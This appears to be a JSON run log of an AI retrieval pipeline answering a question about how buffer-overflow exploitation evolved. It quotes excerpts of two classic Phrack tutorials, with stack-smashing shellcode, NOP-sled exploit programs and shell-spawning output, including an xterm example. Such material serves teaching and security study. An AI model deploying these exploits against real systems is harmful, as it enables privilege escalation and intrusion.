{
  "run": {
    "run_id": "794cdd4be95e9609686b55a7d9c5180530818e67f791c5211735e56787865f5d",
    "created": 1679374521223,
    "run_type": "deploy",
    "config": {
      "blocks": {
        "MODEL_FACTS": {
          "provider_id": "openai",
          "model_id": "gpt-4",
          "use_cache": true
        },
        "MODEL_SHORT": {
          "provider_id": "openai",
          "model_id": "gpt-4",
          "use_cache": true
        },
        "MODEL_1PAGER": {
          "provider_id": "openai",
          "model_id": "gpt-4",
          "use_cache": true
        },
        "PHRACK": { "use_cache": false }
      }
    },
    "status": {
      "run": "succeeded",
      "blocks": [
        {
          "block_type": "input",
          "name": "INPUT",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "data_source",
          "name": "PHRACK",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "map",
          "name": "LOOP",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "chat",
          "name": "MODEL_FACTS",
          "status": "succeeded",
          "success_count": 15,
          "error_count": 0
        },
        {
          "block_type": "reduce",
          "name": "LOOP",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "code",
          "name": "FINAL_CONTENT",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "chat",
          "name": "MODEL_SHORT",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        },
        {
          "block_type": "chat",
          "name": "MODEL_1PAGER",
          "status": "succeeded",
          "success_count": 1,
          "error_count": 0
        }
      ]
    },
    "traces": [
      [
        ["input", "INPUT"],
        [
          [
            {
              "value": {
                "question": "How did the techniques to exploit buffer overflows evolve over time?"
              },
              "error": null
            }
          ]
        ]
      ],
      [
        ["data_source", "PHRACK"],
        [
          [
            {
              "value": [
                {
                  "created": 1679370756816,
                  "document_id": "phrack-55-8",
                  "timestamp": 936835200000,
                  "tags": ["phrack", "issue-55", "article-8"],
                  "hash": "a799c192ad5ae7ce7cc7cfa7cc7f051c51b78119bd15d8b8f5461f46147bb643",
                  "text_size": 18611,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "-------[ Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 08 of 19 ] -------------------------[ The Frame Pointer Overwrite ] --------[ klog <klog@promisc.org> ] ----[ Introduction Buffers can be overflowed, and by overwriting critical data stored in the target process's address space, we can modify its execution flow. This is old news. This article is not much about how to exploit buffer overflows, nor does it explain the vulnerability itself. It just demonstrates it is possible to exploit such a vulnerability even under the worst conditions, like when the target buffer can only be overflowed by one byte. Many other esoteric techniques where the goal is to exploit trusted processes in the most hostile situations exist, including when privileges are dropped. We will only cover the one byte overflow here. ----[ The object of our attack Lets write a pseudo vulnerable suid program, which we will call \"suid\". It is written such that only one byte overflows from its buffer. ipdev:~/tests$ cat > suid.c #include <stdio.h> func(char *sm) { char buffer[256]; int i; for(i=0;i<=256;i++) buffer[i]=sm[i]; } main(int argc, char *argv[]) { if (argc < 2) { printf(\"missing args\\n\"); exit(-1); } func(argv[1]); } ^D ipdev:~/tests$ gcc suid.c -o suid ipdev:~/tests$ As you can see, we won't have much space to exploit this program. In fact, the overflow is caused only by one byte exceeding the buffer's storage space. We will have to use this byte cleverly. Before exploiting anything, we should take a look at what this byte really overwrites (you probably already know it, but hell, who cares). Let's reassemble the stack using gdb, at the moment the overflow occurs. ipdev:~/tests$ gdb ./suid ... (gdb) disassemble func Dump of assembler code for function func: 0x8048134 <func>: pushl %ebp 0x8048135 <func+1>: movl %esp,%ebp 0x8048137 <func+3>: subl $0x104,%esp 0x804813d <func+9>: nop 0x804813e <func+10>: movl $0x0,0xfffffefc(%ebp) 0x8048148 <func+20>: cmpl $0x100,0xfffffefc(%ebp) 0x8048152 <func+30>: jle 0x8048158 <func+36> 0x8048154 <func+32>: jmp 0x804817c <func+72> 0x8048156 <func+34>: leal (%esi),%esi 0x8048158 <func+36>: leal 0xffffff00(%ebp),%edx 0x804815e <func+42>: movl %edx,%eax 0x8048160 <func+44>: addl 0xfffffefc(%ebp),%eax 0x8048166 <func+50>: movl 0x8(%ebp),%edx 0x8048169 <func+53>: addl 0xfffffefc(%ebp),%edx 0x804816f <func+59>: movb (%edx),%cl 0x8048171 <func+61>: movb %cl,(%eax) 0x8048173 <func+63>: incl 0xfffffefc(%ebp) 0x8048179 <func+69>: jmp 0x8048148 <func+20> 0x804817b <func+71>: nop 0x804817c <func+72>: movl %ebp,%esp 0x804817e <func+74>: popl %ebp 0x804817f <func+75>: ret End of assembler dump. (gdb) As we all know, the processor will first push %eip into the stack, as the CALL instruction requires. Next, our small program pushes %ebp over it, as seen at *0x8048134. Finally, it activates a local frame by decrementing %esp by 0x104. This means our local variables will be 0x104 bytes big (0x100 for the string, 0x004 for the integer). Please note that the variables are physically padded to the first 4 bytes, so a 255 byte buffer would take up as much space as a 256 byte buffer. We can now tell what our stack looked like before the overflow occurred: saved_eip saved_ebp char buffer[255] char buffer[254] ... char buffer[000] int i This means that the overflowing byte will overwrite the saved frame pointer, which was pushed into the stack at the beginning of func(). But how can this byte be used to modify the programs execution flow? Let's take a look at what happens with %ebp's image. We already know that it is restored at the end of func(), as we can see at *0x804817e. But what next? (gdb) disassemble main Dump of assembler code for function main: 0x8048180 <main>: pushl %ebp 0x8048181 <main+1>: movl %esp,%ebp 0x8048183 <main+3>: cmpl $0x1,0x8(%ebp) 0x8048187 <main+7>: jg 0x80481a0 <main+32> 0x8048189 <main+9>: pushl $0x8058ad8 0x804818e <main+14>: call 0x80481b8 <printf> 0x8048193 <main+19>: addl $0x4,%esp 0x8048196 <main+22>: pushl $0xffffffff 0x8048198 <main+24>: call 0x804d598 <exit> 0x804819d <main+29>: addl $0x4,%esp 0x80481a0 <main+32>: movl 0xc(%ebp),%eax 0x80481a3 <main+35>: addl $0x4,%eax 0x80481a6 <main+38>: movl (%eax),%edx 0x80481a8 <main+40>: pushl %edx 0x80481a9 <main+41>: call 0x8048134 <func> 0x80481ae <main+46>: addl $0x4,%esp 0x80481b1 <main+49>: movl %ebp,%esp 0x80481b3 <main+51>: popl %ebp 0x80481b4 <main+52>: ret 0x80481b5 <main+53>: nop 0x80481b6 <main+54>: nop 0x80481b7 <main+55>: nop End of assembler dump. (gdb) Great! After func() has been called, at the end of main(), %ebp will be restored into %esp, as seen at *0x80481b1. This means that we can set %esp to an arbitrary value. But remember, this arbitrary value is not *really* arbitrary, since you can only modify the last %esp's byte. Let's check to see if we're right. (gdb) disassemble main Dump of assembler code for function main: 0x8048180 <main>: pushl %ebp 0x8048181 <main+1>: movl %esp,%ebp 0x8048183 <main+3>: cmpl $0x1,0x8(%ebp) 0x8048187 <main+7>: jg 0x80481a0 <main+32> 0x8048189 <main+9>: pushl $0x8058ad8 0x804818e <main+14>: call 0x80481b8 <printf> 0x8048193 <main+19>: addl $0x4,%esp 0x8048196 <main+22>: pushl $0xffffffff 0x8048198 <main+24>: call 0x804d598 <exit> 0x804819d <main+29>: addl $0x4,%esp 0x80481a0 <main+32>: movl 0xc(%ebp),%eax 0x80481a3 <main+35>: addl $0x4,%eax 0x80481a6 <main+38>: movl (%eax),%edx 0x80481a8 <main+40>: pushl %edx 0x80481a9 <main+41>: call 0x8048134 <func> 0x80481ae <main+46>: addl $0x4,%esp 0x80481b1 <main+49>: movl %ebp,%esp 0x80481b3 <main+51>: popl %ebp 0x80481b4 <main+52>: ret 0x80481b5 <main+53>: nop 0x80481b6 <main+54>: nop 0x80481b7 <main+55>: nop End of assembler dump. (gdb) break *0x80481b4 Breakpoint 2 at 0x80481b4 (gdb) run `overflow 257` Starting program: /home/klog/tests/suid `overflow 257` Breakpoint 2, 0x80481b4 in main () (gdb) info register esp esp 0xbffffd45 0xbffffd45 (gdb) It seems we were. After overflowing the buffer by one 'A' (0x41), %ebp is moved into %esp, which is incremented by 4 since %ebp is poped from the stack just before the RET. This gives us 0xbffffd41 + 0x4 = 0xbffffd45. ----[ Getting prepared What does changing the stack pointer give us? We cannot change the saved %eip value directly like in any conventional buffer overflow exploitation, but we can make the processor think it is elsewhere. When the processor returns from a procedure, it only pops the first word on the stack, guessing it is the original %eip. But if we alter %esp, we can make the processor pop any value from the stack as if it was %eip, and thus changing the execution flow. Lets project to overflow the buffer using the following string: [nops][shellcode][&shellcode][%ebp_altering_byte] In order to do this, we should first determine what value we want to alter %ebp (and thus %esp) with. Let's take a look at what the stack will look like when the buffer overflow will have occurred: saved_eip saved_ebp (altered by 1 byte) &shellcode \\ shellcode | char buffer nops / int i Here, we want %esp to point to &shellcode, so that the shellcode's address will be poped into %eip when the processor will return from main(). Now that we have the full knowledge of how we want to exploit our vulnerable program, we need to extract information from the process while running in the context it will be while being exploited. This information consists of the address of the overflowed buffer, and the address of the pointer to our shellcode (&shellcode). Let's run the program as if we wanted to overflow it with a 257 bytes string. In order to do this, we must write a fake exploit which will reproduce the context in which we exploit the vulnerable process. (gdb) q ipdev:~/tests$ cat > fake_exp.c #include <stdio.h> #include <unistd.h> main() { int i; char buffer[1024]; bzero(&buffer, 1024); for (i=0;i<=256;i++) { buffer[i] = 'A'; } execl(\"./suid\", \"suid\", buffer, NULL); } ^D ipdev:~/tests$ gcc fake_exp.c -o fake_exp ipdev:~/tests$ gdb --exec=fake_exp --symbols=suid ... (gdb) run Starting program: /home/klog/tests/exp2 Program received signal SIGTRAP, Trace/breakpoint trap. 0x8048090 in ___crt_dummy__ () (gdb) disassemble func Dump of assembler code for function func: 0x8048134 <func>: pushl %ebp 0x8048135 <func+1>: movl %esp,%ebp 0x8048137 <func+3>: subl $0x104,%esp 0x804813d <func+9>: nop 0x804813e <func+10>: movl $0x0,0xfffffefc(%ebp) 0x8048148 <func+20>: cmpl $0x100,0xfffffefc(%ebp) 0x8048152 <func+30>: jle 0x8048158 <func+36> 0x8048154 <func+32>: jmp 0x804817c <func+72> 0x8048156 <func+34>: leal (%esi),%esi 0x8048158 <func+36>: leal 0xffffff00(%ebp),%edx 0x804815e <func+42>: movl %edx,%eax 0x8048160 <func+44>: addl 0xfffffefc(%ebp),%eax 0x8048166 <func+50>: movl 0x8(%ebp),%edx 0x8048169 <func+53>: addl 0xfffffefc(%ebp),%edx 0x804816f <func+59>: movb (%edx),%cl 0x8048171 <func+61>: movb %cl,(%eax) 0x8048173 <func+63>: incl 0xfffffefc(%ebp) 0x8048179 <func+69>: jmp 0x8048148 <func+20> 0",
                      "hash": "332f2e71e662a5d098b07e64e27512764f8699a81ac8193f0c898f465bf6b321",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8391035795211792
                    }
                  ]
                },
                {
                  "created": 1679370616656,
                  "document_id": "phrack-49-14",
                  "timestamp": 847411200000,
                  "tags": ["phrack", "issue-49", "article-14"],
                  "hash": "b7aea9739a629c340ac066eefccb8d887d9e57732920a78d99b249932e50c6be",
                  "text_size": 60947,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": ".oO Phrack 49 Oo. Volume Seven, Issue Forty-Nine File 14 of 16 BugTraq, r00t, and Underground.Org bring you XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Smashing The Stack For Fun And Profit XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX by Aleph One aleph1@underground.org `smash the stack` [C programming] n. On many C implementations it is possible to corrupt the execution stack by writing past the end of an array declared auto in a routine. Code that does this is said to smash the stack, and can cause return from the routine to jump to a random address. This can produce some of the most insidious data-dependent bugs known to mankind. Variants include trash the stack, scribble the stack, mangle the stack; the term mung the stack is not used, as this is never done intentionally. See spam; see also alias bug, fandango on core, memory leak, precedence lossage, overrun screw. Introduction ~~~~~~~~~~~~ Over the last few months there has been a large increase of buffer overflow vulnerabilities being both discovered and exploited. Examples of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at, etc. This paper attempts to explain what buffer overflows are, and how their exploits work. Basic knowledge of assembly is required. An understanding of virtual memory concepts, and experience with gdb are very helpful but not necessary. We also assume we are working with an Intel x86 CPU, and that the operating system is Linux. Some basic definitions before we begin: A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type. C programmers normally associate with the word buffer arrays. Most commonly, character arrays. Arrays, like all variables in C, can be declared either static or dynamic. Static variables are allocated at load time on the data segment. Dynamic variables are allocated at run time on the stack. To overflow is to flow, or fill over the top, brims, or bounds. We will concern ourselves only with the overflow of dynamic buffers, otherwise known as stack-based buffer overflows. Process Memory Organization ~~~~~~~~~~~~~~~~~~~~~~~~~~~ To understand what stack buffers are we must first understand how a process is organized in memory. Processes are divided into three regions: Text, Data, and Stack. We will concentrate on the stack region, but first a small overview of the other regions is in order. The text region is fixed by the program and includes code (instructions) and read-only data. This region corresponds to the text section of the executable file. This region is normally marked read-only and any attempt to write to it will result in a segmentation violation. The data region contains initialized and uninitialized data. Static variables are stored in this region. The data region corresponds to the data-bss sections of the executable file. Its size can be changed with the brk(2) system call. If the expansion of the bss data or the user stack exhausts available memory, the process is blocked and is rescheduled to run again with a larger memory space. New memory is added between the data and stack segments. /------------------\\ lower | | memory | Text | addresses | | |------------------| | (Initialized) | | Data | | (Uninitialized) | |------------------| | | | Stack | higher | | memory \\------------------/ addresses Fig. 1 Process Memory Regions What Is A Stack? ~~~~~~~~~~~~~~~~ A stack is an abstract data type frequently used in computer science. A stack of objects has the property that the last object placed on the stack will be the first object removed. This property is commonly referred to as last in, first out queue, or a LIFO. Several operations are defined on stacks. Two of the most important are PUSH and POP. PUSH adds an element at the top of the stack. POP, in contrast, reduces the stack size by one by removing the last element at the top of the stack. Why Do We Use A Stack? ~~~~~~~~~~~~~~~~~~~~~~ Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the procedure or function. From one point of view, a procedure call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to dynamically allocate the local variables used in functions, to pass parameters to the functions, and to return values from the function. The Stack Region ~~~~~~~~~~~~~~~~ A stack is a contiguous block of memory containing data. A register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed address. Its size is dynamically adjusted by the kernel at run time. The CPU implements instructions to PUSH onto and POP off of the stack. The stack consists of logical stack frames that are pushed when calling a function and popped when returning. A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call. Depending on the implementation the stack will either grow down (towards lower memory addresses), or up. In our examples we'll use a stack that grows down. This is the way the stack grows on many computers including the Intel, Motorola, SPARC and MIPS processors. The stack pointer (SP) is also implementation dependent. It may point to the last address on the stack, or to the next free available address after the stack. For our discussion we'll assume it points to the last address on the stack. In addition to the stack pointer, which points to the top of the stack (lowest numerical address), it is often convenient to have a frame pointer (FP) which points to a fixed location within a frame. Some texts also refer to it as a local base pointer (LB). In principle, local variables could be referenced by giving their offsets from SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. Although in some cases the compiler can keep track of the number of words on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable administration is required. Futhermore, on some machines, such as Intel-based processors, accessing a variable at a known distance from SP requires multiple instructions. Consequently, many compilers use a second register, FP, for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs. On Intel CPUs, BP (EBP) is used for this purpose. On the Motorola CPUs, any address register except A7 (the stack pointer) will do. Because the way our stack grows, actual parameters have positive offsets and local variables have negative offsets from FP. The first thing a procedure must do when called is save the previous FP (so it can be restored at procedure exit). Then it copies SP into FP to create the new FP, and advances SP to reserve space for the local variables. This code is called the procedure prolog. Upon procedure exit, the stack must be cleaned up again, something called the procedure epilog. The Intel ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, have been provided to do most of the procedure prolog and epilog work efficiently. Let us see what the stack looks like in a simple example: example1.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; } void main() { function(1,2,3); } ------------------------------------------------------------------------------ To understand what the program does to call function() we compile it with gcc using the -S switch to generate assembly code output: $ gcc -S -o example1.s example1.c By looking at the assembly language output we see that the call to function() is translated to: pushl $3 pushl $2 pushl $1 call function This pushes the 3 arguments to function backwards into the stack, and calls function(). The instruction 'call' will push the instruction pointer (IP) onto the stack. We'll call the saved IP the return address (RET). The first thing done in function is the procedure prolog: pushl %ebp movl %esp,%ebp subl $20,%esp This pushes EBP, the frame pointer, onto the stack. It then copies the current SP onto EBP, making it the new FP pointer. We'll call the saved FP pointer SFP. It then allocates space for the local variables by subtracting their size from SP. We must remember that memory can only be addressed in multiples of the word size. A word in our case is 4 bytes, or 32 bits. So our 5 byte buffer is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer is going to take 12 bytes (3 words) of memory. That is why SP is being subtracted by 20. With that in mind our stack looks like this when function() is called (each space represents a byte): bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Buffer Overflows ~~~~~~~~~~~~~~~~ A buffer overflow is the result of stuffing more data into a buffer than it can handle. How can this often found programming error can be taken advantage to execute arbitrary code? Lets look at another example: example2.c ------------------------------------------------------------------------------ void function(char *str) { char buffer[16]; strcpy(buffer,str); } void main() { char large_string[256]; int i; for( i = 0; i < 255; i++) large_string[i] = 'A'; function(large_string); } ------------------------------------------------------------------------------ This is program has a function with a typical buffer overflow coding error. The function copies a supplied string without bounds checking by using strcpy() instead of strncpy(). If you run this program you will get a segmentation violation. Lets see what its stack looks when we call function: bottom of top of memory memory buffer sfp ret *str <------ [ ][ ][ ][ ] top of bottom of stack stack What is going on here? Why do we get a segmentation violation? Simple. strcpy() is coping the contents of *str (larger_string[]) into buffer[] until a null character is found on the string. As we can see buffer[] is much smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that all 250 bytes after buffer in the stack are being overwritten. This includes the SFP, RET, and even *str! We had filled large_string with the character 'A'. It's hex character value is 0x41. That means that the return address is now 0x41414141. This is outside of the process address space. That is why when the function returns and tries to read the next instruction from that address you get a segmentation violation. So a buffer overflow allows us to change the return address of a function. In this way we can change the flow of execution of the program. Lets go back to our first example and recall what the stack looked like: bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Lets try to modify our first example so that it overwrites the return address, and demonstrate how we can make it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 bytes pass the end of buffer1[]. But remember that buffer1[] is really 2 word so its 8 bytes long. So the return address is 12 bytes from the start of buffer1[]. We'll modify the return value in such a way that the assignment statement 'x = 1;' after the function call will be jumped. To do so we add 8 bytes to the return address. Our code is now: example3.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; int *ret; ret = buffer1 + 12; (*ret) += 8; } void main() { int x; x = 0; function(1,2,3); x = 1; printf(\"%d\\n\",x); } ------------------------------------------------------------------------------ What we have done is add 12 to buffer1[]'s address. This new address is where the return address is stored. We want to skip pass the assignment to the printf call. How did we know to add 8 to the return address? We used a test value first (for example 1), compiled the program, and then started gdb: ------------------------------------------------------------------------------ [aleph1]$ gdb example3 GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble main Dump of assembler code for function main: 0x8000490 <main>: pushl %ebp 0x8000491 <main+1>: movl %esp,%ebp 0x8000493 <main+3>: subl $0x4,%esp 0x8000496 <main+6>: movl $0x0,0xfffffffc(%ebp) 0x800049d <main+13>: pushl $0x3 0x800049f <main+15>: pushl $0x2 0x80004a1 <main+17>: pushl $0x1 0x80004a3 <main+19>: call 0x8000470 <function> 0x80004a8 <main+24>: addl $0xc,%esp 0x80004ab <main+27>: movl $0x1,0xfffffffc(%ebp) 0x80004b2 <main+34>: movl 0xfffffffc(%ebp),%eax 0x80004b5 <main+37>: pushl %eax 0x80004b6 <main+38>: pushl $0x80004f8 0x80004bb <main+43>: call 0x8000378 <printf> 0x80004c0 <main+48>: addl $0x8,%esp 0x80004c3",
                      "hash": "9bd0e3932da0892fa6336ca4a122fe4f03a452070695e691dda38af2398eb919",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8326839208602905
                    },
                    {
                      "text": "define DEFAULT_BUFFER_SIZE 512 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr += 4; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Now we can try to guess what the buffer and offset should be: ------------------------------------------------------------------------------ [aleph1]$ ./exploit2 500 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG [aleph1]$ exit [aleph1]$ ./exploit2 600 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG Illegal instruction [aleph1]$ exit [aleph1]$ ./exploit2 600 100 Using address: 0xbffffd4c [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit [aleph1]$ ./exploit2 600 200 Using address: 0xbffffce8 [aleph1]$ ./vulnerable $EGG Segmentation fault [aleph1]$ exit . . . [aleph1]$ ./exploit2 600 1564 Using address: 0xbffff794 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ As we can see this is not an efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple of thousand. The problem is we need to guess *exactly* where the address of our code will start. If we are off by one byte more or less we will just get a segmentation violation or a invalid instruction. One way to increase our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, and then follow it with the return addresses. If we are lucky and the return address points anywhere in the string of NOPs, they will just get executed until they reach our code. In the Intel architecture the NOP instruction is one byte long and it translates to 0x90 in machine code. Assuming the stack starts at address 0xFF, that S stands for shell code, and that N stands for a NOP instruction the new stack would look like this: bottom of DDDDDDDDEEEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of memory 89ABCDEF0123456789AB CDEF 0123 4567 89AB CDEF memory buffer sfp ret a b c <------ [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE] ^ | |_____________________| top of bottom of stack stack The new exploits is then: exploit3.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; for (i = 0; i < bsize/2; i++) buff[i] = NOP; ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; memcpy(buff,\"EGG=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ A good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow is 512 bytes long, so we'll use 612. Let's try to overflow our test program with our new exploit: ------------------------------------------------------------------------------ [aleph1]$ ./exploit3 612 Using address: 0xbffffdb4 [aleph1]$ ./vulnerable $EGG $ ------------------------------------------------------------------------------ Whoa! First try! This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use xterm (all programs linked with the Xt library are vulnerable). You must be running an X server and allow connections to it from the localhost. Set your DISPLAY variable accordingly. ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit3 1124 Using address: 0xbffffdb4 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/sh ^C [aleph1]$ exit [aleph1]$ ./exploit3 2148 100 Using address: 0xbffffd48 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/shHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH HHHHHHHHHHHH Warning: some arguments in previous message were lost Illegal instruction [aleph1]$ exit . . . [aleph1]$ ./exploit4 2148 600 Using address: 0xbffffb54 [aleph1]$ /usr/X11R6/bin/xterm -fg $EGG Warning: Color name \"^1FF V 1@/bin/shTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT TTTTTTTTTTTT Warning: some arguments in previous message were lost bash$ ------------------------------------------------------------------------------ Eureka! Less than a dozen tries and we found the magic numbers. If xterm where installed suid root this would now be a root shell. Small Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~ There will be times when the buffer you are trying to overflow is so small that either the shellcode wont fit into it, and it will overwrite the return address with instructions instead of the address of our code, or the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule. To obtain a shell from these programs we will have to go about it another way. This particular approach only works when you have access to the program's environment variables. What we will do is place our shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory. This method also increases your changes of the exploit working as you can make the environment variable holding the shell code as large as you want. The environment variables are stored in the top of the stack when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the beginning then looks like this: <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our new exploit now looks like this: exploit4.c ------------------------------------------------------------------------------ #include <stdlib.h> #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 #define NOP 0x90 char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_esp(void) { __asm__(\"movl %esp,%eax\"); } void main(int argc, char *argv[]) { char *buff, *ptr, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, eggsize=DEFAULT_EGG_SIZE; if (argc > 1) bsize = atoi(argv[1]); if (argc > 2) offset = atoi(argv[2]); if (argc > 3) eggsize = atoi(argv[3]); if (!(buff = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_esp() - offset; printf(\"Using address: 0x%x\\n\", addr); ptr = buff; addr_ptr = (long *) ptr; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i < eggsize - strlen(shellcode) - 1; i++) *(ptr++) = NOP; for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; buff[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); 